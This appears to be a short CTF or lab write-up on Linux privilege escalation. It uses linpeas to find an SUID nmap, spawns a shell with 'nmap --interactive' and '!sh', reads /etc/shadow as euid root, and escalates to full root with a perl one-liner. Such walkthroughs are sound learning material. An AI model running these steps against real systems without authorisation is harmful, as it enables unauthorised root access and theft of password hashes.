Using linpeas, I found `nmap` has SUID bit enabled

Found a way to spawn an interactive nmap shell using nmap ([Reference](https://pentestlab.blog/2017/09/25/suid-executables/))
![[Pasted image 20240831163100.png]]

- start nmap interactive mode
```bash
nmap --interactive
```

```
nmap> !sh
```
![[Pasted image 20240831163310.png]]

here we can see that we can view contents of file `/etc/shadow` due to `euid=0(root)`

Found a way to become root using a post found on [stackexchange](https://unix.stackexchange.com/questions/645075/attempting-to-get-root-uid-from-root-euid) to become root from root euid
```bash
perl -MEnglish -e '$UID = 0; $ENV{PATH} = "/bin:/usr/bin:/sbin:/usr/sbin"; exec "su - root"'
```

First, I identified whether perl was present in the system
![[Pasted image 20240831163456.png]]
Got root

